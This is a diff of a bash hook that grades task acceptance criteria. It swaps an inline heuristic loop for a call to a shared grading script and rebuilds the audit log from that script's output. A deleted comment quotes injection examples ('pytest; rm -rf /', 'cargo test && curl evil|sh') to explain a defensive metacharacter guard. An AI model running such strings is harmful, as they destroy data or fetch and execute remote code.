@@ -40,231 +40,28 @@ source "${SCRIPT_DIR}/lib/resolve-brana.sh" 2>/dev/null || true
 CRITERIA_COUNT=$(echo "$CRITERIA_JSON" | jq 'length' 2>/dev/null) || CRITERIA_COUNT=0
 [ "$CRITERIA_COUNT" -eq 0 ] && { echo '{"continue": true}'; exit 0; }
 
-# Validate each criterion using deterministic heuristics (ADR-047 §3).
-# Canonical grammar (the 10 patterns below): docs/architecture/ac-grammar.md —
-# edit that file first when adding/changing a heuristic so plan-lint stays in sync (t-2199).
-PASSED=0
-FAILED=0
-UNKNOWN=0
-FAILED_LIST=""
-UNKNOWN_LIST=""
+# Validate each criterion via ac-grade.sh (t-2870, ADR-081 D1) — the shared,
+# standalone heuristic-execution script (t-2869). Canonical grammar (10
+# patterns): docs/architecture/ac-grammar.md — edit that file first when
+# adding/changing a heuristic, then ac-grade.sh (the sole execution point).
+#
+# This hook supplies its own frozen criteria snapshot via --criteria-json
+# (never lets ac-grade.sh re-derive live from tasks.json — a task's
+# acceptance_criteria can change mid-build, and grading against the live
+# value would silently defeat the grader-immutability contract this hook
+# exists to enforce) and its own trusted WORK_DIR via --cwd (skips
+# ac-grade.sh's worktree auto-resolution — this hook already has a verified
+# binding from active-goal.json).
+GRADE_JSON=$("${SCRIPT_DIR}/../scripts/ac-grade.sh" "$TASK_ID" --json --cwd "$WORK_DIR" --criteria-json "$CRITERIA_JSON" 2>/dev/null) \
+    || { echo '{"continue": true}'; exit 0; }
 
-# Shared H7/H10 allowlist. Exact-prefix match is not enough — a substring match
-# (`grep -qE` with no end-anchor) let "pytest; rm -rf /" or "cargo test && curl
-# evil|sh" match the allowlist and reach `eval` unattended (t-2856 challenger
-# finding 1, MEDIUM: pre-existing in H7, doubled by adding H10 on the same
-# allowlist). allowlisted_command() closes the class for both heuristics at
-# once: reject any command containing shell metacharacters BEFORE the prefix
-# check, so an injected suffix can never ride a legitimate prefix through.
-CMD_ALLOWLIST_RE='^(cargo test|pytest|python -m pytest|bun test|npm test|yarn test|bash tests/|\./tests/)'
-allowlisted_command() {
-    local cmd="$1"
-    echo "$cmd" | grep -qE '[;&|`$(){}<>]' && return 1   # metacharacters → reject
-    echo "$cmd" | grep -qE "$CMD_ALLOWLIST_RE"
-}
-
-for i in $(seq 0 $((CRITERIA_COUNT - 1))); do
-    criterion=$(echo "$CRITERIA_JSON" | jq -r ".[$i]" 2>/dev/null) || criterion=""
-    [ -z "$criterion" ] && continue
-
-    # Strip leading "AC: " prefix if present
-    criterion="${criterion#AC: }"
-    criterion="${criterion#AC:}"
-    criterion="${criterion# }"
-
-    # ── Heuristic 1: file exists ──────────────────────────────────────────────
-    if echo "$criterion" | grep -qiE "exists$|^file .+ exists"; then
-        path=$(echo "$criterion" | grep -oE '[a-zA-Z0-9_./-]+\.(sh|md|json|rs|py|ts|js|toml)' | head -1)
-        if [ -n "$path" ]; then
-            target="${WORK_DIR:+$WORK_DIR/}$path"
-            if test -f "$target" 2>/dev/null; then
-                PASSED=$((PASSED + 1))
-            else
-                FAILED=$((FAILED + 1))
-                FAILED_LIST="$FAILED_LIST\n  ✗ $criterion"
-            fi
-            continue
-        fi
-    fi
-
-    # ── Heuristic 2: brana backlog get ... returns ... ────────────────────────
-    if echo "$criterion" | grep -qiE "^brana backlog get .+ returns"; then
-        cmd_part=$(echo "$criterion" | sed 's/ returns.*//')
-        expected=$(echo "$criterion" | grep -oE 'returns .+' | sed 's/^returns //')
-        cli_args=$(echo "$cmd_part" | sed 's/^brana //')
-        result=$(cd "$WORK_DIR" && "$BRANA" $cli_args 2>/dev/null) || result=""
-        if [ -n "$result" ] && echo "$result" | grep -qF "$expected" 2>/dev/null; then
-            PASSED=$((PASSED + 1))
-        else
-            FAILED=$((FAILED + 1))
-            FAILED_LIST="$FAILED_LIST\n  ✗ $criterion"
-        fi
-        continue
-    fi
-
-    # ── Heuristic 3: validate.sh Check N passes ───────────────────────────────
-    if echo "$criterion" | grep -qiE "validate\.sh.*check [0-9]+"; then
-        check_n=$(echo "$criterion" | grep -oE '[Cc]heck [0-9]+' | awk '{print $2}')
-        if [ -f "$WORK_DIR/validate.sh" ] && [ -n "$check_n" ]; then
-            if (cd "$WORK_DIR" && ./validate.sh --check "$check_n" >/dev/null 2>&1); then
-                PASSED=$((PASSED + 1))
-            else
-                FAILED=$((FAILED + 1))
-                FAILED_LIST="$FAILED_LIST\n  ✗ $criterion"
-            fi
-        else
-            UNKNOWN=$((UNKNOWN + 1))
-            UNKNOWN_LIST="$UNKNOWN_LIST\n  ? $criterion"
-        fi
-        continue
-    fi
-
-    # ── Heuristic 4: hook {name}.sh exists in system/hooks/ ──────────────────
-    if echo "$criterion" | grep -qiE "hook .+\.sh exists"; then
-        hook_name=$(echo "$criterion" | grep -oE '[a-zA-Z0-9_-]+\.sh' | head -1)
-        if [ -n "$hook_name" ] && test -f "$WORK_DIR/system/hooks/$hook_name" 2>/dev/null; then
-            PASSED=$((PASSED + 1))
-        else
-            FAILED=$((FAILED + 1))
-            FAILED_LIST="$FAILED_LIST\n  ✗ $criterion"
-        fi
-        continue
-    fi
-
-    # ── Heuristic 5: file {path} contains "{string}" ──────────────────────────
-    if echo "$criterion" | grep -qiE '^file .+ contains "'; then
-        path=$(echo "$criterion" | grep -oE 'file [^ ]+' | awk '{print $2}')
-        search=$(echo "$criterion" | grep -oE '"[^"]+"' | head -1 | tr -d '"')
-        # Sandbox: reject absolute paths and path traversal
-        if [ -n "$path" ] && [ -n "$search" ] && \
-           ! echo "$path" | grep -qE '^/|\.\.' ; then
-            target="${WORK_DIR}/${path}"
-            if [ -f "$target" ] && grep -qF "$search" "$target" 2>/dev/null; then
-                PASSED=$((PASSED + 1))
-            else
-                FAILED=$((FAILED + 1))
-                FAILED_LIST="$FAILED_LIST\n  ✗ $criterion"
-            fi
-        else
-            UNKNOWN=$((UNKNOWN + 1))
-            UNKNOWN_LIST="$UNKNOWN_LIST\n  ? $criterion"
-        fi
-        continue
-    fi
-
-    # ── Heuristic 6: jq '{expr}' {file} returns "{value}" ────────────────────
-    if echo "$criterion" | grep -qiE "^jq '.+' .+ returns"; then
-        expr=$(echo "$criterion" | grep -oE "'[^']+'" | head -1 | tr -d "'")
-        file=$(echo "$criterion" | sed "s/jq '[^']*' //" | grep -oE '[^ ]+' | head -1)
-        expected=$(echo "$criterion" | grep -oE 'returns "[^"]+"' | grep -oE '"[^"]+"' | head -1 | tr -d '"')
-        # Sandbox: reject absolute paths and path traversal
-        if [ -n "$expr" ] && [ -n "$file" ] && [ -n "$expected" ] && \
-           ! echo "$file" | grep -qE '^/|\.\.' ; then
-            target="${WORK_DIR}/${file}"
-            result=$(jq -r "$expr" "$target" 2>/dev/null) || { UNKNOWN=$((UNKNOWN + 1)); UNKNOWN_LIST="$UNKNOWN_LIST\n  ? $criterion"; continue; }
-            if [ "$result" = "$expected" ]; then
-                PASSED=$((PASSED + 1))
-            else
-                FAILED=$((FAILED + 1))
-                FAILED_LIST="$FAILED_LIST\n  ✗ $criterion"
-            fi
-        else
-            UNKNOWN=$((UNKNOWN + 1))
-            UNKNOWN_LIST="$UNKNOWN_LIST\n  ? $criterion"
-        fi
-        continue
-    fi
-
-    # ── Heuristic 7: "{command}" passes ──────────────────────────────────────
-    # Allowlist + metachar guard shared with heuristic 10 (demoable) via
-    # allowlisted_command() — one definition, no drift.
-    if echo "$criterion" | grep -qiE '^"[^"]+" passes$'; then
-        cmd=$(echo "$criterion" | grep -oE '"[^"]+"' | head -1 | tr -d '"')
-        if allowlisted_command "$cmd"; then
-            if (cd "$WORK_DIR" && eval "$cmd" >/dev/null 2>&1); then
-                PASSED=$((PASSED + 1))
-            else
-                FAILED=$((FAILED + 1))
-                FAILED_LIST="$FAILED_LIST\n  ✗ $criterion"
-            fi
-        else
-            UNKNOWN=$((UNKNOWN + 1))
-            UNKNOWN_LIST="$UNKNOWN_LIST\n  ? $criterion"
-        fi
-        continue
-    fi
-
-    # ── Heuristic 8: git log check ────────────────────────────────────────────
-    if echo "$criterion" | grep -qiE "^changes to .+ committed$"; then
-        file=$(echo "$criterion" | sed 's/^[Cc]hanges to //' | sed 's/ [Cc]ommitted$//')
-        result=$(cd "$WORK_DIR" && git log --oneline -- "$file" 2>/dev/null | head -1) || result=""
-        if [ -n "$result" ]; then
-            PASSED=$((PASSED + 1))
-        else
-            FAILED=$((FAILED + 1))
-            FAILED_LIST="$FAILED_LIST\n  ✗ $criterion"
-        fi
-        continue
-    fi
-    if echo "$criterion" | grep -qiE '^commit message contains "'; then
-        search=$(echo "$criterion" | grep -oE '"[^"]+"' | head -1 | tr -d '"')
-        result=$(cd "$WORK_DIR" && git log --oneline --grep="$search" 2>/dev/null | head -1) || result=""
-        if [ -n "$result" ]; then
-            PASSED=$((PASSED + 1))
-        else
-            FAILED=$((FAILED + 1))
-            FAILED_LIST="$FAILED_LIST\n  ✗ $criterion"
-        fi
-        continue
-    fi
-
-    # ── Heuristic 9: validate.sh passes (full run) ───────────────────────────
-    # Reconcile's /goal done-signal (ADR-061 §3, t-2206). Distinct from heuristic 3
-    # (single --check N): runs the whole suite, pass on exit 0. The "check [0-9]" guard
-    # keeps the check-N form on heuristic 3 (which ran first and already continued).
-    if echo "$criterion" | grep -qiE 'validate\.sh' \
-       && echo "$criterion" | grep -qiE '(passes|exit 0|exit code 0)' \
-       && ! echo "$criterion" | grep -qiE 'check [0-9]'; then
-        if [ -f "$WORK_DIR/validate.sh" ]; then
-            if (cd "$WORK_DIR" && ./validate.sh >/dev/null 2>&1); then
-                PASSED=$((PASSED + 1))
-            else
-                FAILED=$((FAILED + 1))
-                FAILED_LIST="$FAILED_LIST\n  ✗ $criterion"
-            fi
-        else
-            UNKNOWN=$((UNKNOWN + 1))
-            UNKNOWN_LIST="$UNKNOWN_LIST\n  ? $criterion"
-        fi
-        continue
-    fi
-
-    # ── Heuristic 10: demoable: <command> ────────────────────────────────────
-    # Pocock demoability (ac-grammar.md #10, t-2856): the criterion names a command
-    # a human can run to watch the feature work. Unattended check: run it iff it
-    # matches heuristic 7's allowlist (CMD_ALLOWLIST_RE, shared definition above);
-    # a non-allowlisted command is NEVER executed → UNKNOWN (demo pending a human
-    # sitting — routed to manual sign-off like any UNKNOWN).
-    if echo "$criterion" | grep -qiE '^demoable: .+'; then
-        cmd=$(echo "$criterion" | sed 's/^[Dd]emoable: *//')
-        if allowlisted_command "$cmd"; then
-            if (cd "$WORK_DIR" && eval "$cmd" >/dev/null 2>&1); then
-                PASSED=$((PASSED + 1))
-            else
-                FAILED=$((FAILED + 1))
-                FAILED_LIST="$FAILED_LIST\n  ✗ $criterion"
-            fi
-        else
-            UNKNOWN=$((UNKNOWN + 1))
-            UNKNOWN_LIST="$UNKNOWN_LIST\n  ? $criterion"
-        fi
-        continue
-    fi
-
-    # ── Fallback: unknown pattern — cannot auto-validate ─────────────────────
-    UNKNOWN=$((UNKNOWN + 1))
-    UNKNOWN_LIST="$UNKNOWN_LIST\n  ? $criterion"
-done
+PASSED=$(jq -r '.counts.pass // 0' <<<"$GRADE_JSON" 2>/dev/null) || PASSED=0
+FAILED=$(jq -r '.counts.fail // 0' <<<"$GRADE_JSON" 2>/dev/null) || FAILED=0
+UNKNOWN=$(jq -r '.counts.unknown // 0' <<<"$GRADE_JSON" 2>/dev/null) || UNKNOWN=0
+FAILED_LIST=$(jq -r '[.graded[]? | select(.verdict=="fail") | "  ✗ " + .criterion] | join("\n")' <<<"$GRADE_JSON" 2>/dev/null) || FAILED_LIST=""
+UNKNOWN_LIST=$(jq -r '[.graded[]? | select(.verdict=="unknown") | "  ? " + .criterion] | join("\n")' <<<"$GRADE_JSON" 2>/dev/null) || UNKNOWN_LIST=""
+[ -n "$FAILED_LIST" ] && FAILED_LIST=$'\n'"$FAILED_LIST"
+[ -n "$UNKNOWN_LIST" ] && UNKNOWN_LIST=$'\n'"$UNKNOWN_LIST"
 
 TOTAL=$((PASSED + FAILED + UNKNOWN))
 MSG=""
@@ -273,14 +70,16 @@ MSG=""
 # plus registered_as_red per declared test — true by construction since t-2216:
 # red-verification.sh is the sole writer of tests_required[] and registers a path only
 # when its staged blob ran red. One JSONL record per criterion + per registered test.
+# (t-2870: built directly from ac-grade.sh's graded[] array — no more grep -F
+# matching a criterion against reconstructed FAILED_LIST/UNKNOWN_LIST strings,
+# which was the original loop's own fragile indirection.)
 AUDIT_FILE="$HOME/.claude/run-state/${TASK_ID}-audit.jsonl"
 mkdir -p "$HOME/.claude/run-state" 2>/dev/null || true
 audit_ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null) || audit_ts=""
-for ai in $(seq 0 $((CRITERIA_COUNT - 1))); do
-    ac=$(echo "$CRITERIA_JSON" | jq -r ".[$ai]" 2>/dev/null); [ -z "$ac" ] && continue
-    if printf '%b' "$FAILED_LIST" | grep -qF "$ac"; then av="fail"
-    elif printf '%b' "$UNKNOWN_LIST" | grep -qF "$ac"; then av="unknown"
-    else av="pass"; fi
+jq -c '.graded[]? // empty' <<<"$GRADE_JSON" 2>/dev/null | while IFS= read -r entry; do
+    ac=$(jq -r '.criterion' <<<"$entry" 2>/dev/null)
+    av=$(jq -r '.verdict' <<<"$entry" 2>/dev/null)
+    [ -z "$ac" ] && continue
     printf '{"ts":"%s","task_id":"%s","criterion":%s,"verdict":"%s"}\n' \
         "$audit_ts" "$TASK_ID" "$(printf '%s' "$ac" | jq -R . 2>/dev/null)" "$av" >> "$AUDIT_FILE" 2>/dev/null || true
 done
